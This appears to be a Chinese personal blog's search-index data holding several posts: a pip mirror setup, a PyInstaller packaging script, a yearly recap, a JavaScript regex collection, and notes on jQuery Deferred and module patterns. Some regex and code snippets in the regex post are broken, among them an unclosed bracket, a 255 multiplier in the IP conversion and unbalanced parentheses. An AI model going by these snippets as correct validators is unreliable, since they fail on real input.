(没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹) 内容如下： [global] index-url = https://pypi.douban.com/simple/ [install] trusted-host=mirrors.aliyun.com windows下，直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini。内容同上。 ","date":"2017-04-26","objectID":"/posts/2017/04/pip%E5%AE%89%E8%A3%85%E6%9B%B4%E6%8D%A2%E5%AE%89%E8%A3%85%E6%BA%90%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F/:0:0","tags":["Python"],"title":"PIP安装：更换安装源，使用国内镜像","uri":"/posts/2017/04/pip%E5%AE%89%E8%A3%85%E6%9B%B4%E6%8D%A2%E5%AE%89%E8%A3%85%E6%BA%90%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F/"},{"categories":["Python"],"content":" 项目中有时会写些py脚本文件，为当作项目工具，方便无Python环境下使用，所以需要打包成exe文件。 ","date":"2017-03-12","objectID":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/:0:0","tags":["Python"],"title":"Python如何打包exe","uri":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/"},{"categories":["Python"],"content":"Python打包exe Q：py生成exe，总共需几步？ A：总共分三步！ ","date":"2017-03-12","objectID":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/:1:0","tags":["Python"],"title":"Python如何打包exe","uri":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/"},{"categories":["Python"],"content":"1. 安装PyInstaller pip install PyInstaller 注意：安装包名区分大小写 ","date":"2017-03-12","objectID":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/:1:1","tags":["Python"],"title":"Python如何打包exe","uri":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/"},{"categories":["Python"],"content":"2. 打包脚本:TargetPy2exe.py.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- \"\"\" @version: ?? @author: Binge @file: TargetPy2exe.py.py @time: 2017-02-07 11:21 @description: convert py to exe by pyinstaller \"\"\" from PyInstaller.__main__ import run if __name__ == '__main__': # 设置打包exe参数：目标py、打包参数 # -F 打包成一个exe文件 # -w 使用窗口，无控制台 # -c 使用控制台，无窗口 # --icon = 图标路径 # --upx-dir 使用upx压缩 # upx391w ups程序目录文件路径 # opts = ['tvn_process.py', '-F'] opts = ['tvn_process.py', '-F', '-w'] # opts = ['tvn_process.py', '-F', '-c'] # opts = ['tvn_process.py', '-F', '-w', '--upx-dir', 'upx391w'] # opts = ['tvn_process.py', '-F', '-w','--icon=tvn_process.ico','--upx-dir','upx391w'] run(opts) ","date":"2017-03-12","objectID":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/:1:2","tags":["Python"],"title":"Python如何打包exe","uri":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/"},{"categories":["Python"],"content":"3. 运行打包脚本，即可生成exe文件","date":"2017-03-12","objectID":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/:1:3","tags":["Python"],"title":"Python如何打包exe","uri":"/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/"},{"categories":["生活"],"content":"2016年小结","date":"2017-01-24","objectID":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/","tags":["生活"],"title":"2016，6了什么","uri":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/"},{"categories":["生活"],"content":" “夕阳最美时，也总是将近黄昏。 世上有很多事都是这样子的，尤其是一些特别辉煌美好的事。 所以你不必伤感，也不用惋惜，纵然到江湖去赶上了春，也不必留住它。 因为这就是人生，有些事你留也留不住。 你一定要先学会忍受它的无情，才会懂得享受它的温柔。 ” ——古龙 ","date":"2017-01-24","objectID":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/:0:0","tags":["生活"],"title":"2016，6了什么","uri":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/"},{"categories":["生活"],"content":"前言 年关将至，总会回想起这一年，完成了哪些事情，未完成哪些事情，收获了什么。。。 想来想去，都是些小事情。这点小事，虽不值得大书特写轰轰烈烈纪念，但还是添两笔，记录一下。 ","date":"2017-01-24","objectID":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/:0:1","tags":["生活"],"title":"2016，6了什么","uri":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/"},{"categories":["生活"],"content":"小结 一、学习 技术变得快，还要赶紧追。 用小站来整理学习笔记，效果不错。 阿尔法狗来了。。。 二、爱好 锻炼：2016没有练，腹肌木有了，胸肌木有了，嘛都木有了。 单车：这一年，断断续续骑了段时间，没有拉100公里以上的长途，速度也没飚过40公里时速。属于慢速短途悠闲骑。 其它没有玩耍的就不再啰嗦。 三、小站 小站开张半年，只攒了（复制）5篇文章，看来忙（懒）得不轻。 借索大侠的话说：“程序猿应该有自己的空间吧，虽然这个东西并不算什么”。有了小站，也方便做资料整理和学习记录。 四、其它 什么都木有干！！！ 五、计划 设定小目标，希望能够完成它。 加强锻炼，召回腹肌。 小站常更新。 ","date":"2017-01-24","objectID":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/:0:2","tags":["生活"],"title":"2016，6了什么","uri":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/"},{"categories":["生活"],"content":"后记 还有一事：前段时间坐三角翼小飞机，体验了爬升、俯冲、失重下降、大转弯、低空过场等动作。所以，以后如果有人问：你咋不上天呢？我就可以答：我真上过天，还吼过。。。 希望新一年，自己能够像小飞机那样飞得潇洒！ 最后，祝各位看官：鸡年大吉，万事如意~~~ 友情推荐 Tuantuan.G：是设计师，也是小伙伴。有想法，有理念。爱画画，有创意。从视觉设计，到UI平面。哪怕通宵达旦，也要设计漂亮。。。去她那里逛逛吧：@Tuantuan.G 索洪波：是程序员，也是段子手，低调深刻有内涵。去他的小站看看吧：@索洪波 ","date":"2017-01-24","objectID":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/:0:3","tags":["生活"],"title":"2016，6了什么","uri":"/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/"},{"categories":["JS"],"content":" 从网上整理的JavaScript的正则表达式，实际项目使用时，还需再做测验 ——Binge 技巧 整数或者小数：^[0-9]+.{0,1}[0-9]{0,2}$ 只能输入数字：\"^[0-9]*$\"。 只能输入n位的数字：\"^\\d{n}$\"。 只能输入至少n位的数字：\"^\\d{n,}$\"。 只能输入m~n位的数字：。\"^\\d{m,n}$\" 只能输入零和非零开头的数字：\"^(0|[1-9][0-9]*)$\"。 只能输入有两位小数的正实数：\"^[0-9]+(.[0-9]{2})?$\"。 只能输入有1~3位小数的正实数：\"^[0-9]+(.[0-9]{1,3})?$\"。 只能输入非零的正整数：\"^+?[1-9][0-9]*$\"。 只能输入非零的负整数：\"^-[1-9][0-9*$\"。 只能输入长度为3的字符：\"^.{3}$\"。 只能输入由26个英文字母组成的字符串：\"^[A-Za-z]+$\"。 只能输入由26个大写英文字母组成的字符串：\"^[A-Z]+$\"。 只能输入由26个小写英文字母组成的字符串：\"^[a-z]+$\"。 只能输入由数字和26个英文字母组成的字符串：\"^[A-Za-z0-9]+$\"。 只能输入由数字、26个英文字母或者下划线组成的字符串：\"^\\w+$\"。 验证用户密码：\"^[a-zA-Z]\\w{5,17}$“正确格式为：以字母开头，长度在6~18之间，只能包含字符、数字和下划线。 验证是否含有^%\u0026',;=?$\"等字符：\"[^%\u0026',;=?$\\x22]+\"。 只能输入汉字：\"^[\\u4e00-\\u9fa5]{0,}$” 验证Email地址：\"^\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*$\"。 验证InternetURL：\"^http://([\\w-]+.)+[\\w-]+(/[\\w-./?%\u0026=]*)?$\"。 验证电话号码：\"^((\\d{3,4}-)|\\d{3.4}-)?\\d{7,8}$“正确格式为：“XXX-XXXXXXX”、“XXXX-XXXXXXXX”、“XXX-XXXXXXX”、“XXX-XXXXXXXX”、“XXXXXXX\"和\"XXXXXXXX”。 验证身份证号（15位或18位数字）：\"^\\d{15}|\\d{18}$\"。 验证一年的12个月：\"^(0?[1-9]|1[0-2])$“正确格式为：“01\"～\"09\"和\"1\"～\"12”。 验证一个月的31天：\"^((0?[1-9])|((1|2)[0-9])|30|31)$“正确格式为；“01\"～\"09\"和\"1\"～\"31”。 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） String.prototype.len=function(){return this.replace(/[^\\x00-\\xff]/g,\"aa\").length;} 技巧 匹配空行的正则表达式：\\n[\\s| ]*\\r 匹配html标签的正则表达式：\u003c(.)\u003e(.)\u003c/(.)\u003e|\u003c(.)/\u003e 匹配首尾空格的正则表达式：(^\\s*)|(\\s*$) 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下： String.prototype.trim = function() { return this.replace(/(^\\s*)|(\\s*$)/g, \"\"); } 利用正则表达式分解和转换IP地址： 下面是利用正则表达式匹配IP地址，并将IP地址转换成对应数值的Javascript程序： function IP2V(ip) { re=/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/g //匹配IP地址的正则表达式 if(re.test(ip)) { return RegExp.$1*Math.pow(255,3))+RegExp.$2*Math.pow(255,2))+RegExp.$3*255+RegExp.$4*1 } else { throw new Error(\"Not a valid IP address!\") } } 不过上面的程序如果不用正则表达式，而直接用split函数来分解可能更简单，程序如下： var ip=\"10.100.20.168\" ip=ip.split(\".\") alert(\"IP值是：\"+(ip[0]*255*255*255+ip[1]*255*255+ip[2]*255+ip[3]*1)) 匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)* 匹配网址URL的正则表达式：http://([\\w-]+.)+[\\w-]+(/[\\w- ./?%\u0026=]*)? 利用正则表达式限制网页表单里的文本框输入内容： 用正则表达式限制只能输入中文： var onkeyup=\"value=value.replace(/[^\\u4E00-\\u9FA5]/g,'')\" var onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\u4E00-\\u9FA5]/g,''))\" 用正则表达式限制只能输入全角字符： var onkeyup=\"value=value.replace(/[^\\uFF00-\\uFFFF]/g,'')\" var onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\uFF00-\\uFFFF]/g,''))\" 用正则表达式限制只能输入数字： var onkeyup=\"value=value.replace(/[^\\d]/g,'') \" var onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\d]/g,''))\" 用正则表达式限制只能输入数字和英文： var onkeyup=\"value=value.replace(/[\\W]/g,'') \" var onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\d]/g,''))\" 技巧 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5] 评注：匹配中文还真是个头疼的事，有了这个表达式就好办了 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1） 匹配空白行的正则表达式：\\n\\s*\\r 评注：可以用来删除空白行 匹配HTML标记的正则表达式：\u003c(\\S*?)[^\u003e]*\u003e.*?|\u003c.*? /\u003e 评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力 匹配首尾空白字符的正则表达式：^\\s*|\\s*$ 评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式 匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)* 评注：表单验证时很实用 匹配网址URL的正则表达式：[a-zA-z]+://[^\\s]* 评注：网上流传的版本功能很有限，上面这个基本可以满足需求 匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 评注：表单验证时很实用 匹配国内电话号码：\\d{3}-\\d{8}|\\d{4}-\\d{7} 评注：匹配形式如 0511-4405222 或 021-87888822 匹配腾讯QQ号：[1-9][0-9]{4,} 评注：腾讯QQ号从10000开始 匹配中国邮政编码：[1-9]\\d{5}(?!\\d) 评注：中国邮政编码为6位数字 匹配身份证：\\d{15}|\\d{18} 评注：中国的身份证为15位或18位 匹配ip地址：\\d+.\\d+.\\d+.\\d+ 评注：提取ip地址时有用 匹配特定数字： ^[1-9]\\d*$　//匹配正整数 ^-[1-9]\\d*$ //匹配负整数 ^-?[1-9]\\d*$　//匹配整数 ^[1-9]\\d*|0$　//匹配非负整数（正整数 + 0） ^-[1-9]\\d*|0$　//匹配非正整数（负整数 + 0） ^[1-9]\\d*.\\d*|0.\\d*[1-9]\\d*$　//匹配正浮点数 ^-([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*)$　//匹配负浮点数 ^-?([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*|0?.0+|0)$　//匹配浮点数 ^[1-9]\\d*.\\d*|0.\\d*[1-9]\\d*|0?.0+|0$　//匹配非负浮点数（正浮点数 + 0） ^(-([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*))|0?.0+|0$　//匹配非正浮点数（负浮点数 + 0） 评注：处理大量数据时有用，具体应用时注意修正 匹配特定字符串： ^[A-Za-z]+$　//匹配由26个英文字母组成的字符串 ^[A-Z]+$　//匹配由26个英文字母的大写组成的字符串 ^[a-z]+$　//匹配由","date":"2016-09-06","objectID":"/posts/2016/09/js%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%A7%E5%85%A8/:0:0","tags":["JS"],"title":"JS正则表达式大全","uri":"/posts/2016/09/js%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%A7%E5%85%A8/"},{"categories":["JS"],"content":" JQuery源码-Deferred 寥寥代码，犀利锋锐，设计思想，值得学习 ——Binge Deferred的概念请看第一篇 http://www.cnblogs.com/aaronjs/p/3348569.html   ****************** 构建Deferred对象时候的流程图**************************   **********************源码解析**********************   因为callback被剥离出去后，整个deferred就显得非常的精简 jQuery.extend({ Deferred : \u003c/span\u003e\u003cspan style=\"color:rgb(0,0,255); line-height:1.5!important\"\u003efunction\u003c/span\u003e\u003cspan style=\"line-height:1.5!important\"\u003e(){} when : \u003c/span\u003e\u003cspan style=\"color:rgb(0,0,255); line-height:1.5!important\"\u003efunction\u003c/span\u003e\u003cspan style=\"line-height:1.5!important\"\u003e() )} 对于extend的继承这个东东，在之前就提及过jquery如何处理内部jquery与init相互引用this的问题 对于JQ的整体架构一定要弄懂 http://www.cnblogs.com/aaronjs/p/3278578.html 所以当jQuery.extend只有一个参数的时候，其实就是对jQuery静态方法的一个扩展 我们在具体看看2个静态方法内部都干了些什么： Deferred整体结构： 源码精简了部分代码 Deferred: function( func ) {var tuples =[//action, add listener, listener list, final state [ “resolve”, “done”, jQuery.Callbacks(“once memory”), “resolved”], [ “reject”, “fail”, jQuery.Callbacks(“once memory”), “rejected”], [ “notify”, “progress”, jQuery.Callbacks(“memory”) ] ], state = “pending”, promise ={ state: function() {}, always: function() {}, then: function( /fnDone, fnFail, fnProgress /) { },//Get a promise for this deferred //If obj is provided, the promise aspect is added to the object promise: function( obj ) {} }, deferred ={}; jQuery.each( tuples, function( i, tuple ) { deferred[ tuple[0] + “With” ] =list.fireWith; }); promise.promise( deferred ); //All done! returndeferred; }, 显而易见Deferred是个工厂类，返回的是内部构建的deferred对象 tuples 创建三个$.Callbacks对象，分别表示成功，失败，处理中三种状态 创建了一个promise对象，具有state、always、then、primise方法 扩展primise对象生成最终的Deferred对象，返回该对象 这里其实就是3个处理,但是有个优化代码的地方,就是把共性的代码给抽象出来,通过动态生成了 具体源码分析: Deferred自身则围绕这三个对象进行更高层次的抽象 触发回调函数列表执行(函数名) 添加回调函数（函数名） 回调函数列表（jQuery.Callbacks对象） deferred最终状态（第三组数据除外） var tuples =[//action, add listener, listener list, final state [ “resolve”, “done”, jQuery.Callbacks(“once memory”), “resolved”], [ “reject”, “fail”, jQuery.Callbacks(“once memory”), “rejected”], [ “notify”, “progress”, jQuery.Callbacks(“memory”) ] ], 这里抽象出2组阵营： 1组：回调方法/事件订阅  done，fail，progress 2组：通知方法/事件发布  resolve，reject，notify，resolveWith，rejectWith，notifyWith tuples 元素集 其实是把相同有共同特性的代码的给合并成一种结构，然后通过一次处理 jQuery.each( tuples, function( i, tuple ) {var list = tuple[ 2], stateString = tuple[ 3]; promise[ tuple[1] ] =list.add;if( stateString ) { list.add(function() { state =stateString;//[ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2].lock ); } deferred[ tuple[0] ] = function() { deferred[ tuple[0] + “With” ]( this === deferred ? promise : this, arguments );return this; }; deferred[ tuple[0] + “With” ] =list.fireWith; }); 对于tuples的3条数据集是分2部分处理的 第一部分将回调函数存入 promise[ tuple[1] ] = list.add; 其实就是给promise赋予3个回调函数 promise.done = $.Callbacks(“once memory”).add promise.fail = $.Callbacks(“once memory”).add promise.progressl = $.Callbacks(“memory”).add 如果存在deferred最终状态 默认会预先向doneList,failList中的list添加三个回调函数 if( stateString ) { list.add(function() {//state = [ resolved | rejected ] state =stateString;//[ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2].lock ); } ************************************************************* 这里有个小技巧 i ^ 1 按位异或运算符 所以实际上第二个传参数是1、0索引对调了，所以取值是failList.disable与doneList.disable ************************************************************* 通过stateString有值这个条件，预先向doneList,failList中的list添加三个回调函数 分别是: doneList : [changeState, failList.disable, processList.lock] failList : [changeState, doneList.disable, processList.lock] changeState 改变状态的匿名函数，deferred的状态，分为三种：pending(初始状态), resolved(解决状态), rejected(拒绝状态) 不论deferred对象最终是resolve（还是reject），在首先改变对象状态之后，都会disable另一个函数列表failList(或者doneList) 然后lock processList保持其状态，最后执行剩下的之前done（或者fail）进来的回调函数 所以第一步最终都是围绕这add方法 done/fail/是list.add也就是 callbacks.add ，将回调函数存入回调对象中 第二部分很简单，给deferred对象扩充6个方法 resolve/reject/notify 是 callbacks.fireWith ，执行回调函数 resolveWith/rejectWith/notifyWith 是 callbacks.fireWith 队列方法引用 最后合并prom","date":"2016-08-03","objectID":"/posts/2016/08/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-02/:0:0","tags":["JS"],"title":"JavaScript 模式设计-02","uri":"/posts/2016/08/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-02/"},{"categories":["JS"],"content":" “The key is to acknowledge from the start that you have no idea how this will grow. When you accept that you don’t know everything, you begin to design the system defensively. You identify the key areas that may change, which often is very easy when you put a little bit of time into it. For instance, you should expect that any part of the app that communicates with another system will likely change, so you need to abstract that away.” ——一切皆可变，所以要抽象。 模块论 大家可能都或多或少地使用了模块化的代码，模块是一个完整的强健程序架构的一部分，每个模块都是为了单独的目的为创建的，回到Gmail，我们来个例子，chat聊天模块看起来是个单独的一部分，其实它是有很多单独的子模块来构成，例如里面的表情模块其实就是单独的子模块，也被用到了发送邮件的窗口上。 另外一个是模块可以动态加载，删除和替换。 在JavaScript里，我们有几种方式来实现模块，大家熟知的是module模式和对象字面量,如果你已经熟悉这些，请忽略此小节，直接跳到CommonJS部分。 Module模式 module模式是一个比较流行的设计模式，它可以通过大括号封装私有的变量，方法，状态的，通过包装这些内容，一般全局的对象不能直接访问，在这个设计模式里，只返回一个API，其它的内容全部被封装成私有的了。 另外，这个模式和自执行的函数表达式比较相似，唯一的不同是module返回的是对象，而自执行函数表达式返回的是function。 众所周知， JavaScript不想其它语言一样有访问修饰符，不能为每个字段或者方法声明private,public修饰符，那这个模式我们是如何实现的呢？那就是return一个对象，里面包括一些公开的方法，这些方法有能力去调用内部的对象。 看一下，下面的代码，这段代码是一个自执行代码，声明里包括了一个全局的对象basketModule， basket数组是一个私有的，所以你的整个程序是不能访问这个私有数组的，同时我们return了一个对象，其内包含了3个方法（例如addItem,getItemCount,getTotal)，这3个方法可以访问私有的basket数组。 var basketModule = (function() { var basket = []; //privatereturn { //exposed to public　addItem: function(values) { basket.push(values); }, getItemCount: function() { return basket.length; }, getTotal: function(){ var q = this.getItemCount(),p=0; while(q--){ p+= basket[q].price; } return p; } } }()); 同时注意，我们return的对象直接赋值给了basketModule，所以我们可以像下面一样使用： //basketModule is an object with properties which can also be methodsbasketModule.addItem({item:'bread',price:0.5}); basketModule.addItem({item:'butter',price:0.3}); console.log(basketModule.getItemCount()); console.log(basketModule.getTotal()); //however, the following will not work:console.log(basketModule.basket);//(undefined as not inside the returned object)console.log(basket); //(only exists within the scope of the closure) 那在各个流行的类库（如Dojo, jQuery)里是如何来做呢？ Dojo Dojo试图使用dojo.declare来提供class风格的声明方式，我们可以利用它来实现Module模式，例如如果你想再store命名空间下声明basket对象，那么可以这么做： //traditional way var store = window.store || {}; store.basket = store.basket || {}; //using dojo.setObject dojo.setObject(\"store.basket.object\", (function() { var basket = []; function privateMethod() { console.log(basket); } return { publicMethod: function(){ privateMethod(); } }; }())); 结合dojo.provide一起来使用，非常强大。 YUI 下面的代码是YUI原始的实现方式： YAHOO.store.basket = function () { //\"private\" variables: var myPrivateVar = \"I can be accessed only within YAHOO.store.basket .\"; //\"private\" method: var myPrivateMethod = function () { YAHOO.log(\"I can be accessed only from within YAHOO.store.basket\"); } return { myPublicProperty: \"I'm a public property.\", myPublicMethod: function () { YAHOO.log(\"I'm a public method.\"); //Within basket, I can access \"private\" vars and methods: YAHOO.log(myPrivateVar); YAHOO.log(myPrivateMethod()); //The native scope of myPublicMethod is store so we can //access public members using \"this\": YAHOO.log(this.myPublicProperty); } }; } ();   jQuery jQuery里有很多Module模式的实现，我们来看一个不同的例子，一个library函数声明了一个新的library，然后创建该library的时候，在document.ready里自动执行init方法。 function library(module) { $(function() { if (module.init) { module.init(); } }); return module; } var myLibrary = library(function() { return { init: function() { /*implementation*/ } }; }()); 对象自面量 对象自面量使用大括号声明，并且使用的时候不需要使用new关键字，如果对一个模块里的属性字段的publice/private不是很在意的话，可以使用这种方式，不过请注意这种方式和JSON的不同。对象自面量： var item={name: \"tom\", value:123} JSON: var item={\"name\":\"tom\", \"value\":123} 。 var myModule = { myProperty: 'someValue', //object literals can contain properties and methods. //here, another object is defined for configuration //purposes: myConfig: { useCaching: true, language: 'en' }, //a very basic method myMethod: function () { console.log('I can haz functionality?'); }, //output a value based on current configuration myMethod2: function () { console.log('Caching is:' + (this.myConfig.useCaching) ? 'enabled' : 'disabled'); }, /","date":"2016-07-11","objectID":"/posts/2016/07/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-01/:0:0","tags":["JS"],"title":"JavaScript 模式设计-01","uri":"/posts/2016/07/javascript-%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1-01/"},{"categories":["生活"],"content":"开博了，等你来 “只有初恋般的热情和宗教般的意志，人才可能成就某种事业。” ——路遥 ","date":"2016-06-06","objectID":"/posts/2016/06/welcome-to-binge-blog/:0:0","tags":["生活"],"title":"Welcome to Binge Blog","uri":"/posts/2016/06/welcome-to-binge-blog/"},{"categories":["生活"],"content":"前言 Binge Blog 终于慢腾腾地开通了。。。 两年前就想搭个站玩玩，结果各种原因未能实现。 直到今年，这种想法日益强烈，光说不干假把式，于是，利用两个周末时间，完成自己的小站。 这样，能有个地儿可以折腾点自己的东西，还是蛮有意思的。 正所谓：站不在大，好玩就中！ ","date":"2016-06-06","objectID":"/posts/2016/06/welcome-to-binge-blog/:0:1","tags":["生活"],"title":"Welcome to Binge Blog","uri":"/posts/2016/06/welcome-to-binge-blog/"},{"categories":["生活"],"content":"正文 关于小站： 1. 找空间 稳定； 大，大，大； 便于管理； 要流行； 要时尚； …… 于是，我选择了Octocat。。。 注：Octocat（章鱼猫）＝ Octopus（章鱼）+ Cat（猫） 2. 注册域名 刚开始，在godaddy注册了域名。没有VISA和paypal不要紧，可使用alipay支付宝。 用了两三天，便收到了godaddy的邮件通知：将要收回域名，付款将会全额退还。具体原因，此处不赘述。最后，收到退款，免费玩了三天域名。 分享下godaddy域名使用体会： 优点： com域名免认证，可快速生效； 可以使用优惠码，价格有优惠； 缺点： 国内会出现无法解析的问题，需要自己动手解决； 会公开域名注册人的信息（包括联系电话），如果想要隐私保护，需要额外付费才能享受信息保护服务。 以前的价格优势已无，对于部分域名注册费用还要比国内贵得多； 后来，就在万网注册个域名。com域名带认证，不到半天就搞定。 分享下万网域名使用体会： 流程简单，配置方便； 阿里云解析，生效速度很快。比如一些免认证的域名，一两分钟就能生效使用； 域名购买后，有账单发票，且有域名证书图片。便于用户声明域名所有权。 小站域名： bingerambo.com：外号binge名称域名已被国外注册。想起《第一滴血》里史泰龙扮演的硬汉兰博。于是就再加上rambo,便有了bingerambo。 3. 内容 自己整理：笔记和感想，有关技术、阅读、兴趣和其它杂谈。希望积跬步，致千里。 好友原创：好友写的文章，分享到小站。 欢迎投稿：文章、图片都可。 如果您的原创和投稿，入驻小站，都是小编我的荣幸。 4. 友情链接介绍 Tuantuan.G：是设计师，也是小伙伴。有想法，有理念。爱画画，有创意。从视觉设计，到UI平面。哪怕通宵达旦，也要设计漂亮。。。去她那里逛逛吧：@Tuantuan.G 索洪波：是程序员，也是段子手，低调深刻有内涵。去他的小站看看吧：@索洪波 ","date":"2016-06-06","objectID":"/posts/2016/06/welcome-to-binge-blog/:0:2","tags":["生活"],"title":"Welcome to Binge Blog","uri":"/posts/2016/06/welcome-to-binge-blog/"},{"categories":["生活"],"content":"后记 小站发布，记录点滴生活。。。 特别感谢 [Tuantuan.G]，在百忙之余，提供了丰富的图片素材。让我方便修图，配图攒文。同时，也对小站的完善提出了宝贵建议，并分享其原创作品。 感谢看到这里的你。。。 最后，希望来这儿逛的你，好心情~~~ ","date":"2016-06-06","objectID":"/posts/2016/06/welcome-to-binge-blog/:0:3","tags":["生活"],"title":"Welcome to Binge Blog","uri":"/posts/2016/06/welcome-to-binge-blog/"}]